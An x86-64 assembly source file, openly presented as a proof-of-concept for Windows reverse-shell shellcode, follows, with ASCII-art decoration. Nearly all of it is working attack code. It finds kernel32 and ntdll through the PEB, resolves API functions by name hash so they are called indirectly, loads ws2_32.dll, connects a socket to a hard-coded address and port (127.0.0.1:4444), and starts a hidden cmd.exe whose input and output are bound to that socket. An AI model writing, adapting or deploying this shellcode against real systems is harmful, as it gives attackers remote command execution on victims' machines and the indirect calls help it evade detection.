BITS 64

; Reverse Shell with Indirect Funcalls
;
; This proof-of-concept represents the minimum
; required to establish a reverse shell. This
; code includes dynamically resolving functions
; and calling them indirectly. This is just the
; start to what is possible with only shellcode.
;
;                       ``
;                     .001.^
;                     u$ON=1
;                     z00BAI
;                    I..=~.
;                   ;s<’’’
;                   NRX~=-`
;                   z0c^<X^
;                   ~B0s~^`
;                    @@$H~’
;                   n$0=XN;,`
;                  iBBB0vU1=~’`
;                  `$@00cRr`vui
;                   FAHZuqr-’
;                   ZZUFA@Fi.`
;                  ;BRHv n$U^-
;                `ARN1   ^@si
;                ‘Onv~     01.’
;                cOqr      rs.`
;                aUU`       uI`
;               `RO-         :.`
;               nn~`         -=.~I-`
;               =1^’..`      `..`

        CALL    INIT_SHELLCODE

        SUB     RSP,    0x50
        MOV     RBP,    RSP

        CALL    INIT_KERNEL32_API

; Windows ABI follows a standard calling convention.
;
; RCX                   => 1st parameter
; RDX                   => 2nd parameter
; R8                    => 3rd parameter
; R9                    => 4th parameter
; [RSP + 0x20]          => 5th parameter
; [RSP + 0x28]          => 6th parameter
; ...
; [RSP + 0x00 .. 0x018] Belong to the functions
; being called. This stack space is used to save
; any arguments that as may need be.

FUNCTIONS:

; WSAStartup calls for 2 parameters.
;
; RCX                   => Version requested.
; RDX                   => Pointer to WSAData.
;
; WSAData is a 400 byte structure. It 
; is not required to be zeroed out.

RUN_WSASTARTUP:
        MOV     RCX,    QWORD   [RBP + 0x10]
        CALL    SET_FUNCTION

        MOV     RCX,    0x0202
        SUB     RSP,    0x190
        MOV     RDX,    RSP
        SUB     RSP,    0x20
        CALL    RUN_FUNCTION

        ADD     RSP,    0x1B0
        CMP     RAX,    0
        JNZ     RUN_EXITPROCESS

; WSASocketA calls for 6 parameters.
; 
; RCX                   => Address family.
; RDX                   => Type.
; R8                    => Protocol.
; R9                    => Pointer to protocol info.
; [RSP + 0x20]          => Group.
; [RSP + 0x28]          => Flags.
; 
; Protocol Info may be 0. Group may be 0.
; Flags may be 0.
; 
; WSASocketA returns a handle to a valid
; socket opened by the OS.

RUN_WSASOCKETA:
        MOV     RCX,    QWORD   [RBP + 0x08]
        CALL    SET_FUNCTION

        MOV     RCX,    2
        MOV     RDX,    1
        MOV     R8,     6
        XOR     R9,     R9
        PUSH    0
        PUSH    0
        SUB     RSP,    0x20
        CALL    RUN_FUNCTION

        ADD     RSP,    0x30
        CMP     RAX,    0xFFFFFFFFFFFFFFFF
        JZ      RUN_EXITPROCESS

        MOV     QWORD   [RBP + 0x40],   RAX

; connect calls for 3 arguments.
;
; RCX                  => Socket handle.
; RDX                  => Socket address.
; R8                   => Size of socket address.
; R8                   => Size of socket address.
;
; Socket address is a 16 byte structure
; consisting of address, port, and family.
; This structure also has 8 bytes of padding.

RUN_CONNECT:
        MOV     RCX,    QWORD   [RBP]
        CALL    SET_FUNCTION

        MOV     RCX,    QWORD   [RBP + 0x40]
        PUSH    0
        MOV     RAX,    0x0100007F5C110002
        PUSH    RAX
        MOV     RDX,    RSP
        MOV     R8,     0x10
        SUB     RSP,    0x20
        CALL    RUN_FUNCTION

        ADD     RSP,    0x30
        CMP     RAX,    0
        JNZ     RUN_EXITPROCESS

; CreateProcessA calls for 10 arguments.
;
; RCX                  => Pointer to application name.
; RDX                  => Pointer to command line.
; R8                   => Pointer to process attributes.
; R9                   => Pointer to thread attributes.
; [RSP + 0x20]         => Boolean to inherit handles.
; [RSP + 0x28]         => Creation flags.
; [RSP + 0x30]         => Environment.
; [RSP + 0x38]         => Current directory.
; [RSP + 0x40]         => Startup information.
; [RSP + 0x48]         => Process information.
; 
; Inherit handles must be true for a process receiving
; different standard handles.
; 
; Startup information is a 104 byte structure that
; includes fields for standard handles and 
; startup routine.
; 
; Process information is a 16 byte structure for
; process and thread information. Is not required to

RUN_CREATEPROCESSA:
        MOV     RCX,    QWORD   [RBP + 0x20]
        CALL    SET_FUNCTION

        XOR     RCX,    RCX
        PUSH    0
        PUSH    0
        MOV     RAX,    0x006578652E646D63
        PUSH    RAX
        MOV     RDX,    RSP
        XOR     R8,     R8
        XOR     R9,     R9
        MOV     RAX,    QWORD   [RBP + 0x40]
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    0
        PUSH    0
        MOV     RAX,    0x0000010000000000
        PUSH    RAX
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0x68
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        LEA     RAX,    QWORD   [RSP + 0x08]
        PUSH    RAX
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX
        PUSH    0
        PUSH    0
        PUSH    0x08000000
        PUSH    1
        SUB     RSP,    0x20
        CALL    RUN_FUNCTION

        ADD     RSP,    0xF0

RUN_EXITPROCESS:
        MOV     RCX,    QWORD   [RBP + 0x28]
        CALL    SET_FUNCTION

        XOR     RCX,    RCX
        CALL    RUN_FUNCTION

;                       _._                 ;
;                  t,. P$$b,                ;
;                 _ k$4$I$$R                ;
;                AP$$$$KA$$$SGb,            ;
;                 K$$L`‘q’^$$Q$$}           ;
;                ,d$$$$% $$P4$$’            ;
;               ,$$P’^$$S$$’                ;
;             d$$$$b. ‘K$$’                 ;
;       7$$$$.$$$$$$’   *                   ;
;       v$$$$~*’”$$$b,.                     ;
;        d$$$k  ‘$sIS$$._                   ;
;       “^’.$bdIb$$$$”`                     ;
;          K$$FQ$$$,,                       ;
;               “k$$$$$  .,nM$$,            ;
;                 `P$$$Bb$$$SS$$;           ;
;                 .,$$$hi:)PY$$$.           ;
;              :$$u$$K`  `;$$$$$,,.         ;
;              ;R$$$$P’, :;:P$$$$$$$.       ;
;                 .7$$$m,x,.z$Iiu$$$I:      ;
;               p$$$$$$$S$II$$$Iiu$$$.      ;
;              ‘K**~$$II$$$’’S$$$$Z*’       ;
;                  ‘$$$I$$$;                ;
;                   S$$U$$I                 ;
;                    K$$”’                  ;

INIT_SHELLCODE:
        CLD
        MOV     RAX,    0x7369746E656C6973
        MOV     RAX,    QWORD   [RSP]
        AND     SPL,    0xF0
        PUSH    RAX
        RET

GET_NTDLL:
        MOV     RAX,    GS:[0x60]
        MOV     RAX,    [RAX + 0x18]
        MOV     RAX,    [RAX + 0x30]
        MOV     RAX,    [RAX + 0x10]
        RET

GET_KERNEL32:
        MOV     RAX,    GS:[0x60]
        MOV     RAX,    [RAX + 0x18]
        MOV     RAX,    [RAX + 0x30]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX + 0x10]
        RET

INIT_KERNEL32_API:
;         CALL    GET_KERNEL32
;         MOV     QWORD   [RBP + 0X50],   RAX
;
; GET_EXITPROCESS:
;         MOV     RCX,    QWORD   [RBP + 0x50]
;         MOV     RDX,    0x4FD18963
;         LEA     R8,     QWORD   [RBP + 0x28]
;         CALL    FIND_FUNCTION

        CALL    GET_NTDLL
        MOV     QWORD   [RBP + 0X50],   RAX

GET_EXITTHREAD:
        MOV     RCX,    QWORD   [RBP + 0x50]
        MOV     RDX,    0x6DEC1356
        LEA     R8,     QWORD   [RBP + 0x28]
        CALL    FIND_FUNCTION

        CALL    GET_KERNEL32
        MOV     QWORD   [RBP + 0X50],   RAX

GET_CREATEPROCESSA:
        MOV     RCX,    QWORD   [RBP + 0x50]
        MOV     RDX,    0x6BA6BCC9
        LEA     R8,     QWORD   [RBP + 0x20]
        CALL    FIND_FUNCTION

GET_LOADLIBRARYA:
        MOV     RCX,    QWORD   [RBP + 0x50]
        MOV     RDX,    0xC917432
        LEA     R8,     QWORD   [RBP + 0x18]
        CALL    FIND_FUNCTION

        MOV     RCX,    QWORD   [RBP + 0x18]
        CALL    SET_FUNCTION

LOAD_WS232:
        PUSH    0
        PUSH    0x6C6C
        MOV     RAX,    0x642E32335F327377
        PUSH    RAX
        MOV     RCX,    RSP
        SUB     RSP,    0x20

        CALL    RUN_FUNCTION

        ADD     RSP,    0x38
        MOV     QWORD   [RBP + 0x48],   RAX

GET_WSASTARTUP:
        MOV     RCX,    QWORD   [RBP + 0x48]
        MOV     RDX,    0x80B46A3D
        LEA     R8,     QWORD   [RBP + 0x10]
        CALL    FIND_FUNCTION

GET_WSASOCKETA:
        MOV     RCX,    QWORD   [RBP + 0x48]
        MOV     RDX,    0xDE78322D
        LEA     R8,     QWORD   [RBP + 0x08]
        CALL    FIND_FUNCTION

GET_CONNECT:
        MOV     RCX,    QWORD   [RBP + 0x48]
        MOV     RDX,    0xC0577762
        LEA     R8,     QWORD   [RBP]
        CALL    FIND_FUNCTION

        RET

FIND_FUNCTION:

PARSE_MODULE:
        PUSH    R8
        MOV     R8D,    DWORD   [RCX + 0x3C]
        LEA     R8,     QWORD   [RCX + R8]
        MOV     R8D,    DWORD   [R8 + 0x88]
        LEA     R8,     QWORD   [RCX + R8]
        MOV     R9D,    DWORD   [R8 + 0x18]
        MOV     R10D,   DWORD   [R8 + 0x20]
        LEA     R10,    QWORD   [RCX + R10]

SEARCH:
        DEC     R9,
        MOV     ESI,    DWORD   [R10 + R9 * 0x04]
        LEA     RSI,    QWORD   [RCX + RSI]
        XOR     RAX,    RAX
        XOR     R11,    R11

HASH:
        LODSB
        TEST    AL,     AL
        JZ      COMPARE
        ROR     R11D,   0x07
        ADD     R11D,   EAX
        JMP     HASH

COMPARE:
        CMP     RDX,    R11
        JNZ     SEARCH
        
RETURN_FUNCTION:
        MOV     EAX,    DWORD   [R8 + 0x24]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOVZX   EDX,    WORD    [RAX + R9 * 0x02]
        MOV     EAX,    DWORD   [R8 + 0x1C]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOV     EAX,    DWORD   [RAX + RDX * 0x04]
        LEA     RAX,    QWORD   [RCX + RAX]
        POP     R8
        MOV     QWORD   [R8],   RAX
        RET

SET_FUNCTION:
        XOR     RAX,    RAX
        MOV     QWORD   [RBP + 0x30],   RAX
        MOV     QWORD   [RBP + 0x30],   RCX
        RET

RUN_FUNCTION:
        JMP     QWORD   [RBP + 0x30]